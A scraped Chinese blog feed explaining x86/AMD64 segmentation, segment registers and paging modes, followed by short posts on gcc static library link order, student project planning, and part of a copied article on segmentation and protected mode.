SS）用于指向用户段。当描述符被加载到段寄存器之一时，段选择器会选择该描述符。这导致处理器自动将选定的描述符加载到段寄存器的软件不可见部分。</p><p>描述符表寄存器—三个描述符表寄存器（GDTR、LDTR 和 IDTR）用于指向系统段。描述符表寄存器标识了该描述符表的虚拟内存位置和大小。</p><p>任务寄存器（TR）—描述当前任务状态段（TSS）的位置和限制。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401042009183.png"></p><p>上面两张图显示了分段所使用的寄存器和数据结构，其中第二张图的从左往右：<br>段选择器：这些数据都存储在段寄存器中如CS、DS等等。段选择寄存器的作用是去系统表（GDT、LDT、IDT）中查找的<strong>偏移值</strong>。</p><p><strong>关于系统表的详细描述都在AMD手册第二本的4.6节</strong></p><h2 id="实模式下的分段"><a href="#实模式下的分段" class="headerlink" title="实模式下的分段"></a>实模式下的分段</h2><p>8086的CPU是16位的，但intel的工程师希望在不改变CPU寄存器和指令集的基础上，让它可以可以寻址更大的内存范围。于是他们使用了一种叫segmentation的机制，即一个逻辑地址（logical address）由segment加上offset组成，一般表达为segement:offset的形式。</p><p>当segment的值放入segment register时，就是告诉CPU：现在要访问这个segment对应的内存区域，然后再根据offset的值，在这个segment内找到对应的字节。转换后形成的地址被称作线性地址（linear address），若offset为16位，linear address &#x3D; segment&lt;&lt;4 + offset，则寻址范围就扩大成了20位，比如logical address为0xA000:0x5F00，转换成linear address就是0xA5F00。</p><p>这种内存访问被称为实模式（Real Mode），因为linear address是由segment基址移位加上一个偏移得到，因此实模式下的这种segmentation被称为shift-and-add segmentation。</p><h2 id="8086虚拟模式下的分段"><a href="#8086虚拟模式下的分段" class="headerlink" title="8086虚拟模式下的分段"></a>8086虚拟模式下的分段</h2><p>Virtual-8086模式支持在保护模式下运行的16位实模式程序。它使用简单形式的内存分段、可选分页和有限的保护检查。</p><p>段基址是给定段中的最低地址，等于段选择器 * 16。POP 和 MOV 指令的工作方式与实模式下完全相同，可用于将（可能）新的段选择器加载到其中一个段寄存器。</p><h2 id="保护模式下的分段"><a href="#保护模式下的分段" class="headerlink" title="保护模式下的分段"></a>保护模式下的分段</h2><p>80286也使用segmentation，但和8086不同的是，80286中segment register存的不再是segment的起始地址，而是一个segment selector，通过这个selector查找GDT表获得segment descriptor，segment descriptor存的才是segment的起始地址，因此保护模式下的这种segmentation被称为table-based segmentation（区别于实模式的shift-and-add方式）。</p><h2 id="长模式中的分段"><a href="#长模式中的分段" class="headerlink" title="长模式中的分段"></a>长模式中的分段</h2><p>长模式又分为了两种子模式：</p><ul><li>64bit长模式</li><li>兼容模式</li></ul><p>64bit长模式:下禁用分段，创建平面<code>64</code>位虚拟地址空间。正如将要看到的，某些段寄存器（特别是系统段寄存器）的某些功能继续在 <code>64</code> 位模式下使用。</p><p>兼容模式：这个模式和传统模式中的分段处理是一致。</p><h3 id="64bit下的段寄存器"><a href="#64bit下的段寄存器" class="headerlink" title="64bit下的段寄存器"></a>64bit下的段寄存器</h3><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401011800896.png"></p><p>CS：</p><p>64 位模式下的 CS 寄存器。在 64 位模式下，CS 寄存器的大部分隐藏部分被忽略。 64 位模式仅识别 L（长整型）、D（默认操作大小）和 DPL（描述符特权级别）属性。地址计算假定 CS.base 值为 0。CS 引用不检查 CS.limit 值，而是检查有效地址是否采用规范形式。</p><p>DS、ES、SS：</p><p>64 位模式下的 DS、ES 和 SS 寄存器。在 64 位模式下，ES、DS 和 SS 段寄存器的内容被忽略。段寄存器隐藏部分中的所有字段（基址、限制和属性）都将被忽略。64 位模式下引用 ES、DS 或 SS 段的地址计算被视为段基址为 0。处理器不执行限制检查，而是检查所有虚拟地址引用是否采用规范形式。</p><p>GS、FS：</p><p>与 <code>CS、DS、ES</code> 和 <code>SS</code> 段不同，<code>FS</code> 和 <code>GS</code> 段覆盖<sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote">&lt;span class&#x3D;”hint–top hint–rounded” aria-label&#x3D;”Segment Override 段覆盖   我们已经知道，有效地址是通过段寄存器值加上相应偏移量的值来计算的。但是，如果我们想使用特定代码的默认段之外的其他段寄存器怎么办？段覆盖提供了这样一种方法：</p><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre><pre><code class="hljs c">GS寄存器常用来访问进程的控制块(PCB)<br><br>FS寄存器常用来访问TLS本地线程存储<br></code></pre>">[2]</span></a></sup>可以在 64 位模式下使用。当在 64 位模式下使用 `FS` 和 `GS` 段覆盖时，它们各自的基地址将用于有效地址 (EA<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="Effective address (EA) 中文又称之为偏移地址、有效地址。其实就是相对于基地址的偏移">[1]</span></a></sup>) 计算。完整的 `EA` 计算则变为（`FS` 或 `GS​​`）。FS.base 和 GS.base 值也扩展到完整的 64 位虚拟地址大小。<p><code>fs</code> 和 <code>gs</code> 是唯一在 64 位模式下执行任何操作的段覆盖。</p><h1 id="分页的管理"><a href="#分页的管理" class="headerlink" title="分页的管理"></a>分页的管理</h1><p>我们已经知道，现代cpu的内存管理方式。分段的方法使用的越来越少。下面我们学习cpu是如何分页的。</p><h2 id="长模式"><a href="#长模式" class="headerlink" title="长模式"></a>长模式</h2><p>下面这张图显示了，长模式下两种子模式的内存管理方法。<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401011730560.png"></p><p>可以看到，实际上在64bit模式下内存管理是直接通过分页机制进行的，而不再需要前文所述的哪些步骤。但是对应兼容模式来说是需要的，首先将逻辑地址转换为线性地址（虚拟地址），然后通过分页机制完成虚拟地址到物理地址的转换。</p><p>需要注意这里的<code>paging</code>是不可选的。</p><h2 id="传统模式"><a href="#传统模式" class="headerlink" title="传统模式"></a>传统模式</h2><p>由于传统模式主要是32bit地址。<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401011737457.png"><br>由此我们可以看出在传统模式中，只有实模式不需要通过页转换就直接由线性地址变成物理地址，这是因为实模式一般用于操作系统启动时，这使得页映射操作不便进行。</p><p>需要注意保护模式和虚拟8086模式下的<code>paging</code>是可选的。不同于长模式都是不可选的。实模式不需要进行页转换。</p><h1 id="寄存器划分"><a href="#寄存器划分" class="headerlink" title="寄存器划分"></a>寄存器划分</h1><p>由于<code>64bit长模式</code>单独使用一种内存模型，所以我们需要分开讨论寄存器的使用。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401011800896.png"></p><h2 id="64bit长模式"><a href="#64bit长模式" class="headerlink" title="64bit长模式"></a>64bit长模式</h2><p>在该模式下只有CS、FS、GS可以使用，其中FS寄存器和GS寄存器的主要作用是：   </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asm">MOV AX , [BX] ;这是没有使用段覆盖的情况, 有效地址等于 DS&lt;&lt;4 + BX<br>MOV AX, SS : [BX] ;这就是使用了段前缀的情况, 有效地址等于 SS&lt;&lt;4 + BX<br></code></pre></td></tr></table></figure><h2 id="其他模式"><a href="#其他模式" class="headerlink" title="其他模式"></a>其他模式</h2><p>在其他模式下,寄存器是照常使用的。</p><p><a href="https://ysc2.github.io/2024/01/02/segmentation%E5%92%8C%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%EF%BC%88%E4%B8%80%EF%BC%89/">关于segmentation和保护模式的关系</a></p><h1 id="分段机制"><a href="#分段机制" class="headerlink" title="分段机制"></a>分段机制</h1><p>由上我们已经知道了虽然分段机制的使用已经很少了，但是我们仍然需要了解它。</p><h1 id="分页机制概述"><a href="#分页机制概述" class="headerlink" title="分页机制概述"></a>分页机制概述</h1><p>不管是intel的<code>IA32</code>还是AMD的<code>Long</code>模式都需要使用分页来进行内存管理，并且很多时候使用分页大于使用分段。并且每个进程都可以应用自己的页表。</p><p>传统的 <code>x86</code> 架构支持将 <code>32</code> 位虚拟地址转换为 <code>32</code> 位物理地址（作为特殊模式支持更大的物理地址，例如 <code>36</code> 位或 <code>40</code> 位地址）。 <code>AMD64</code> 架构增强了这种支持，允许将 <code>64</code> 位虚拟地址转换为 <code>52</code> 位物理地址，尽管处理器实现可以支持更小的虚拟地址和物理地址空间。</p><h2 id="页面翻译（转换）概述"><a href="#页面翻译（转换）概述" class="headerlink" title="页面翻译（转换）概述"></a>页面翻译（转换）概述</h2><p>下图显示了长模式中使用的页面翻译层次结构的概述。传统模式分页使用此转换层次结构的子集（传统模式中不存在页面映射级别 4 表，并且可能会或可能不会使用 PDP 表，具体取决于启用的分页模式）。第 5 级转换，即页面映射级别 5，仅在启用 5 级分页时才存在。如图所示，虚拟地址分为多个字段，每个字段用作转换表中的偏移量。完整的翻译链由虚拟地址字段引用的所有表条目组成。最低阶虚拟地址位用作物理页的字节偏移量。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401041418963.png"></p><p>关于页大小的支持：</p><p>支持以下物理页大小：<code>4 KB</code>、<code>2 MB</code>、<code>4 MB</code> 和 <code>1 GB</code>。</p><p>在长模式下，可以使用 <code>4-KB</code>、<code>2-MB</code> 和 <code>1-GB</code> 大小。</p><p>在传统模式下，可以使用 <code>4KB</code>、<code>2MB</code> 和 <code>4MB</code> 大小。</p><p>虚拟地址的长度为 <code>32</code> 位，并且可以使用最多支持的物理地址大小的物理地址。 <code>AMD64</code> 架构允许将最多 <code>64</code> 位长的虚拟地址转换为最多 <code>52</code> 位长的物理地址，从而增强了传统转换支持。 </p><p>页面翻译设置选项：</p><ul><li>Page-Translation Enable (CR0.PG)          PTE</li><li>Physical-Address Extensions (CR4.PAE)     PAE</li><li>Page-Size Extensions (CR4.PSE)            PSE</li><li>Long-Mode Active (EFER.LMA)               LMA</li></ul><p>分别是页翻译使能、物理地址扩展、页大小扩展、长模式活动（自己乱翻译的）。下表体现了不同模式下的页面翻译选项的使用情况：<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401041436284.png"></p><p>当开启了<code>PAE</code>时 <code>PAE</code> 分页将<strong>页转换表条目</strong>的大小加倍至 <code>64</code> 位，以便表条目可以容纳更大的物理内存。</p><h2 id="长模式下的页翻译（转换）机制"><a href="#长模式下的页翻译（转换）机制" class="headerlink" title="长模式下的页翻译（转换）机制"></a>长模式下的页翻译（转换）机制</h2><p>长模式页面转换需要使用物理地址扩展（PAE）。在激活长模式之前，必须通过将 <code>CR4.PAE</code> 设置为 <code>1</code> 来启用 <code>PAE</code>。在启用 <code>PAE</code> 之前激活长模式会导致发生一般保护异常 (#GP)。并且在长模式下 <code>PAE</code> 是一直开启的。因此页目录项 (PDE.PS) 中的 PS 位在 4 KB 和 2 MB 页面大小之间进行选择，并且忽略 <code>CR4.PSE</code> 位。当支持 <code>1 GB</code> 页面时，<code>PDPE</code>。 <code>PS</code> 位选择 <code>1 GB</code> 页面大小。</p><p>开启长模式后，虚拟地址的位数从<code>32</code>位增长至<code>64</code>位。并且这个模式和传统模式的不同在于没有了两种页翻译模式：正常分页模式和PAE分页模式。</p><p>在长模式下，当 5 级分页禁用时（CR4[LA57]&#x3D;0），CR3 寄存器用于指向 PML4 基地址；当 5 级分页使能时（CR4[LA57]&#x3D;1），CR3 寄存器用于指向 PML5 基地址。 ）。 CR3 在长模式下扩展为 64 位，允许 PML4 或 PML5 表位于 52 位物理地址空间中的任何位置。</p><p>以下是长模式下的<code>CR3</code>寄存器中的数值。<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401041729160.png"></p><h4 id="4KB-页转换"><a href="#4KB-页转换" class="headerlink" title="4KB 页转换"></a>4KB 页转换</h4><p>使用的是4级页表时的结构。<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401041733509.png"></p><p>使用4级页表时，<code>64</code>位虚拟地址被划为6个部分，</p><p>使用5级页表的结构。<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401041735404.png"></p><h4 id="2MB-页转换"><a href="#2MB-页转换" class="headerlink" title="2MB 页转换"></a>2MB 页转换</h4><p>页所占的空间越大，所需要的页表级数就越低。使用<code>2MB</code>时，页转换结构如下：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401041739078.png"></p><p>当开启5级页表时： </p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401041739029.png"></p><h4 id="2GB-页转换"><a href="#2GB-页转换" class="headerlink" title="2GB 页转换"></a>2GB 页转换</h4><p>在长模式下，1 GB 物理页转换是通过将虚拟地址划分为最多五个字段来执行的。最多三个字段用作级别页面翻译层次结构的索引。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401041742965.png"></p><p>这里需要注意的是，虽然是一个二级页转换，但是使用的是<code>PML4T</code>表和<code>PDPE</code>表，而不是靠近物理内存的页表。</p><p>当开启了5级页表时；</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401041745086.png"></p><h2 id="传统模式下的页翻译（转换）机制"><a href="#传统模式下的页翻译（转换）机制" class="headerlink" title="传统模式下的页翻译（转换）机制"></a>传统模式下的页翻译（转换）机制</h2><p>传统模式下有两种翻译模式：</p><ul><li>正常分页(Non-PAE)</li><li>PAE分页</li></ul><p><code>x86-64</code>架构使用<code>CR3</code>寄存器存储页表的基地址，该寄存器中存储的格式和其使用两种页翻译模式有关：<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401041440792.png"></p><p>从上图中我们可以看到：</p><ul><li>页表基地址字段（就是最长的白色的段）的长度取决于所使用的模式<ul><li>在<code>Non-PAE</code>模式下其占用了<code>31:12</code>位的空间</li><li>在<code>PAE</code>模式下占用了<code>31:5</code>位的空间</li></ul></li><li>Page-Level Writethrough (PWT) Bit.页级直写 (PWT) 位。位 3。页级写通指示最高级别的页转换表是否具有写回或写通缓存策略。当PWT&#x3D;0时，表有写回缓存策略。当PWT&#x3D;1时，表具有writethrough缓存策略。</li><li>Page-Level Cache Disable (PCD) Bit.页级高速缓存禁用 (PCD) 位。位 4。页级高速缓存禁用指示最高级别页转换表是否可高速缓存。当 PCD&#x3D;0 时，表可缓存。当 PCD&#x3D;1 时，该表不可缓存。</li><li>Reserved，保留位，写入CR3 时，保留字段应由软件清0。</li></ul><h3 id="正常分页-Non-PAE"><a href="#正常分页-Non-PAE" class="headerlink" title="正常分页(Non-PAE)"></a>正常分页(Non-PAE)</h3><p>这个模式支持的<code>4KB</code>和<code>4MB</code>的页大小。</p><h4 id="4KB的页面转换"><a href="#4KB的页面转换" class="headerlink" title="4KB的页面转换"></a>4KB的页面转换</h4><p>下图显示了这个模式下的<code>4KB</code>页面翻译（转换）<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401041454544.png"></p><p>首先这是一个二级页表。4 KB 物理页转换是通过将 32 位虚拟地址划分为三个字段来执行的。上面两个字段中的每一个都用作两级页面翻译层次结构的索引。虚拟地址被划分三段，每一段都是对应页的偏移地址，最后一个是物理页的偏移地址。</p><p>从上图可以看到在页目录表、页表中存储的结构：<code>PDE</code> <code>PTE</code>。它们的具体结构如下：</p><p>PDE：<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401041501120.png"></p><p>PTE：<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401041502264.png"></p><h4 id="4MB的页面转换"><a href="#4MB的页面转换" class="headerlink" title="4MB的页面转换"></a>4MB的页面转换</h4><p>4 MB 页面转换。仅当启用页面大小扩展 (CR4.PSE&#x3D;1) 且禁用物理地址扩展 (CR4.PAE&#x3D;0) 时，才支持 4 MB 页面转换。</p><p>PSE 以 32 位 PDE 格式 (PDE.PS) 定义页面大小位。处理器在页面转换期间使用该位来支持 4 MB 和 4 KB 页面。当 PDE.PS 设置为 1 时，选择 4 MB 页面，并且 PDE 直接指向 4 MB 物理页面。 PTE 不用于 4 MB 页面转换。如果 PDE.PS 被清除为 0，或者如果禁用 4 MB 页面转换，则 PDE 指向 PTE。</p><p>上面我们说了<code>4KB</code>的页面转换，而<code>4MB</code>的页面转换实际上更加简单。如下图所示：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401041505588.png"></p><p>有一个二级页表直接变成了一级页表。虚拟地址不在被划分为三个段，而是两个段。并且仔细看的话PED旁边的数字从32变成了40，这是开启了PSE（页大小扩展）的结果。</p><blockquote><p>AMD64 架构修改了 PSE 模式下的传统 32 位 PDE 格式，将物理地址大小支持增加到 40 位。地址大小的增加是通过使用位 20:13 来保存八个额外的高阶物理地址位来实现的。位 21 被保留，必须清除为 0。如下图PDE结构</p></blockquote><div class="note note-info">            <p>关于PSE模式就是上面我们提到的四种页翻译选项之一。</p>          </div><p>此时的PDE结构又不相同了，因为少了一级页表：<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401041507240.png"></p><h3 id="PAE模式"><a href="#PAE模式" class="headerlink" title="PAE模式"></a>PAE模式</h3><p>上面我们说了非PAE模式下的页翻译机制，现在我们看PAE模式下又和之前的哪个模式有什么不一样的地方。</p><p>当启用物理地址扩展 (CR4.PAE&#x3D;1) 时，使用 <code>PAE</code> 分页。 <code>PAE</code> 分页将页转换表条目的大小加倍至 <code>64</code> 位（所以我们在下面会看到每一个页表项的位数变成了64位），以便表条目可以容纳更大的<code>52</code>位的物理内存。</p><p>每个表的大小仍然是 <code>4 KB</code>，这意味着每个表可以容纳 <code>512</code> 个 <code>64</code> 位条目。 <code>PAE</code> 分页还引入了第三级页转换表，称为页目录指针表 (<code>PDPT</code>)。</p><p>和非PAE模式不同还有：PAE 分页模式下大页的大小为 <code>2 MB</code>，而不是 <code>4 MB</code>。 PAE 使用页目录页大小位 (PDE.PS) 来允许在 <code>4 KB</code> 和 <code>2 MB</code> 页大小之间进行选择。 PAE 自动使用页面大小位，因此 PAE 分页将忽略 <code>CR4.PSE</code> 的值。</p><h4 id="4KB-PAE页转换"><a href="#4KB-PAE页转换" class="headerlink" title="4KB PAE页转换"></a>4KB PAE页转换</h4><p>直接使用上了三级页表，这也是传统模式下支持的最高级了。<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401041521968.png"></p><p>可以看到虚拟地址被划为四段，多了一个<code>Page-Directory-Pointer Offset</code>页目录指针表。</p><ul><li>31-30位索引到四条页表项的PDPE</li><li>29-21位索引到512条页表项的PDE</li><li>10-12位索引到512条页表项的PTE</li><li>11-9位索引到具体的物理页地址</li></ul><p>具体的关于各种页的结构如下：     </p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401041644776.png"></p><h4 id="2MB-PAE页转换"><a href="#2MB-PAE页转换" class="headerlink" title="2MB PAE页转换"></a>2MB PAE页转换</h4><p>具体内容：<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401041645177.png"></p><p>和<code>4KB</code>的不同如下：</p><ul><li>使用二级表，而不是三级表<br>其他和<code>4KB</code>基本一致。</li></ul><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401041647561.png"></p><h1 id="其他知识点"><a href="#其他知识点" class="headerlink" title="其他知识点"></a>其他知识点</h1><h2 id="限制检查"><a href="#限制检查" class="headerlink" title="限制检查"></a>限制检查</h2><p>除 64 位模式外，所有引用内存的指令都会执行限制检查。限制检查检测尝试访问当前段边界之外的内存、尝试执行当前代码段之外的指令以及在当前描述符表之外进行索引。如果指令未通过限制检查，则所有其他段限制违规都会发生一般保护异常，或者堆栈段限制违规会发生堆栈故障异常。</p><p>在 64 位模式下，在访问 CS、DS、ES、FS、GS 和 SS 选择器寄存器引用的任何段期间，不会检查段限制。相反，处理器会检查用于引用内存的虚拟地址是否采用规范地址形式。在 64 位模式下，与传统模式和兼容模式一样，会检查描述符表限制。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>AMD64 Architecture Programmer’s Manual Volume 1:Application Programming</p><p>AMD64 Architecture Programmer’s Manual Volume 2:System Programming</p><p><a href="https://zhuanlan.zhihu.com/p/67735248">https://zhuanlan.zhihu.com/p/67735248</a></p><p><a href="https://zhuanlan.zhihu.com/p/67714693">https://zhuanlan.zhihu.com/p/67714693</a></p><p><a href="https://www.includehelp.com/embedded-system/segment-override-prefix-8086-microprocessor.aspx">https://www.includehelp.com/embedded-system/segment-override-prefix-8086-microprocessor.aspx</a></p><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span>Effective address (EA) 中文又称之为偏移地址、有效地址。其实就是相对于基地址的偏移<a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span>Segment Override 段覆盖   我们已经知道，有效地址是通过段寄存器值加上相应偏移量的值来计算的。但是，如果我们想使用特定代码的默认段之外的其他段寄存器怎么办？段覆盖提供了这样一种方法：<br><figure class="highlight plaintext"><table><tr><td class="gutter">undefined</td><td class="code">undefined</td></tr></table></figure><a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于静态链接库的问题</title>
    <link href="/2024/01/02/%E5%85%B3%E4%BA%8E%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%E7%9A%84%E9%97%AE%E9%A2%98/"/>
    <url>/2024/01/02/%E5%85%B3%E4%BA%8E%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%E7%9A%84%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>总结静态链接库中的链接顺序问题</p><span id="more"></span><p>我们知道静态库实际上是一个归档文件，其通过<code>ar</code>命令获得。这个归档文件中包含了*.o文件。并且链接器处理静态库时的顺序是从命令的右侧到左侧。</p><p>实际上链接器对于静态链接的处理是：从后向前扫描用户提供的静态库，然后在.o中寻找是否有需要的函数信息，如果没有则会去处理下一个.o文件。</p><p>所以我们需要将被依赖的静态库放在命令的后面，将存在依赖的静态库放在前面：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc  -la -lb main.c <span class="hljs-comment">#liba.a依赖于libb.a</span><br></code></pre></td></tr></table></figure><p>如果静态库少的时候我们可以通过它们的依赖关系来确定谁先谁后，但是一旦静态库过多，我们就很难知道它们之间的依赖关系。此时可以通过将它们都引用两次：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -la -lb -la -lb main.c <br></code></pre></td></tr></table></figure><p>但是这种方法过于麻烦，所以<code>gcc</code>提供了简便方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc main.c --start-group -la -lb --end-group <span class="hljs-comment">#通过这两个参数，将若干个静态库分为同一个组进行拓扑排序，自动解决依赖关系。</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>做一个项目需要什么</title>
    <link href="/2024/01/02/%E5%81%9A%E4%B8%80%E4%B8%AA%E9%A1%B9%E7%9B%AE%E9%9C%80%E8%A6%81%E4%BB%80%E4%B9%88/"/>
    <url>/2024/01/02/%E5%81%9A%E4%B8%80%E4%B8%AA%E9%A1%B9%E7%9B%AE%E9%9C%80%E8%A6%81%E4%BB%80%E4%B9%88/</url>
    
    <content type="html"><![CDATA[<p>自己对于做项目的一点总结</p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最为一个学生，我们需要通过一些项目来提高自己的代码能力。那么在写代码前，我们需要完成什么？</p><h1 id="需求分析"><a href="#需求分析" class="headerlink" title="需求分析"></a>需求分析</h1><p>不管是什么项目它都有用处。那么你的项目是干什么的，可以解决什么问题，这是我们首先需要决定的。或者说我们需要确定好一个项目目标，这样我们就有了方向。</p><p>比如做一个学生管理软件，我们就需要知道自己的软件是要解决什么问题的。<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401020145043.png"><br>画好图，搞清楚每个事件的基本事件流</p><h1 id="程序背景"><a href="#程序背景" class="headerlink" title="程序背景"></a>程序背景</h1><h2 id="软硬件环境需求"><a href="#软硬件环境需求" class="headerlink" title="软硬件环境需求"></a>软硬件环境需求</h2><p>首先要搞清楚两个东西：</p><ul><li>你在哪个操作系统上写代码（开发环境）</li><li>你为哪个操作系统写代码（运行环境）</li></ul><h2 id="技术选型"><a href="#技术选型" class="headerlink" title="技术选型"></a>技术选型</h2><p>你的这个项目需要使用哪些技术，这些技术又是哪些东西来进行具体的实现的。</p><h2 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h2><p>写代码之前，需要画好流程图以方便我们快速实现。</p><iframe src='/myjs/pdfjs/web/viewer.html?file=word/需求与设计文档.docx' style='width:820px;height:800px'></iframe><h1 id="自定义项目模板"><a href="#自定义项目模板" class="headerlink" title="自定义项目模板"></a>自定义项目模板</h1><p>1、项目名：<br>基于立创·梁山派的XXX设计；<br>项目类型不限，根据自己想法自定义，但必须包含硬件设计与软件设计;<br>2、目标：<br>描述项目的目标与初心；<br>3、功能介绍：<br>描述项目实现了哪些功能；<br>4、技能掌握：<br>通过这个项目中我学到了什么，还有哪些不足需要加强的地方；<br>5、碰到的问题与解决方法（非常重要）：<br>聊一聊你在项目设计过程中碰到了哪些问题，你又是怎么解决的呢；<br>6、演示视频：<br>上传一段项目演示讲解视频；</p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>segmentation和保护模式（三）</title>
    <link href="/2024/01/02/segmentation%E5%92%8C%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <url>/2024/01/02/segmentation%E5%92%8C%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%EF%BC%88%E4%B8%89%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>分段模式和保护模式（二）</p><span id="more"></span><div class="Post-RichTextContainer"><div class="css-1yuhvjn"><div class="css-376mun"><div class="RichText ztext Post-RichText css-1em8ozd" options="[object Object]"><p data-first-child="" data-pid="ttv-yEsj"><a href="https://zhuanlan.zhihu.com/p/67714693" class="internal" data-za-detail-view-id="1043">segmentation和保护模式（二）</a></p><p data-pid="tNVNRK2T"><b>80386保护模式时代</b></p><p data-pid="XA2WqB27">自从80386引入了<a href="https://zhuanlan.zhihu.com/p/65298260" class="internal" data-za-detail-view-id="1043">paging</a>后，segmentation其实已经没有什么存在的价值了，可以被取代了，然而intel为了保持向前兼容性，依然保留了segmentation机制，所以从80386到今天的x64处理器，地址转换的完整路径都是这样的：</p><figure data-size="normal"><noscript><img src="https://pic1.zhimg.com/v2-4b99be34296575a2423eabbfdffb4cb8_b.png" data-caption="" data-size="normal" data-rawwidth="995" data-rawheight="150" class="origin_image zh-lightbox-thumb" width="995" data-original="https://pic1.zhimg.com/v2-4b99be34296575a2423eabbfdffb4cb8_r.jpg"/></noscript><div><img src="https://pic1.zhimg.com/80/v2-4b99be34296575a2423eabbfdffb4cb8_720w.webp" data-caption="" data-size="normal" data-rawwidth="995" data-rawheight="150" class="origin_image zh-lightbox-thumb lazy" width="995" data-original="https://pic1.zhimg.com/v2-4b99be34296575a2423eabbfdffb4cb8_r.jpg" data-actualsrc="https://pic1.zhimg.com/v2-4b99be34296575a2423eabbfdffb4cb8_b.png" data-original-token="v2-4b99be34296575a2423eabbfdffb4cb8" height="150" data-lazy-status="ok"></div></figure><p data-pid="5nTPh1gy">而且，segmentation是必须存在的，不可以被disable，反倒paging是可选的（Long Mode下paging是必须的，参考<a href="https://zhuanlan.zhihu.com/p/69334474" class="internal" data-za-detail-view-id="1043">这篇文章</a>）。想想也是，要是没有segmentation只有paging，你让1982年的80286怎么办。</p><p data-pid="oJe1EE2N">如果不使用paging的话，则linear address就直接是物理地址了；如果使用paging，从paging的角度，linear address就是虚拟地址（这也是为什么x86里虚拟地址不叫virtual address，而是叫linear addess）。</p><p data-pid="KQqZuoPx">可是使用segmentation真的是多此一举诶，白白增加一次查表和转换的时间，那可不可以绕过这一步呢？</p><p data-pid="sNEoq7zw">一个巧妙的方法就是将所有的segment register都指向同一个segment descriptor，然后让该descriptor里存的segment起始地址为0，这样所有的segment都重叠了，都是从0地址开始的，就等同于没有了，logical address也直接等于linear address了，这种内存划分被称为<b>平坦内存模型</b>（flat momery model），与之对应的是segmented memory model。</p><figure data-size="normal"><noscript><img src="https://pic4.zhimg.com/v2-aa74314824e11c7456e94577991b9f67_b.jpg" data-caption="" data-size="normal" data-rawwidth="600" data-rawheight="263" class="origin_image zh-lightbox-thumb" width="600" data-original="https://pic4.zhimg.com/v2-aa74314824e11c7456e94577991b9f67_r.jpg"/></noscript><div><img src="https://pic4.zhimg.com/80/v2-aa74314824e11c7456e94577991b9f67_720w.webp" data-caption="" data-size="normal" data-rawwidth="600" data-rawheight="263" class="origin_image zh-lightbox-thumb lazy" width="600" 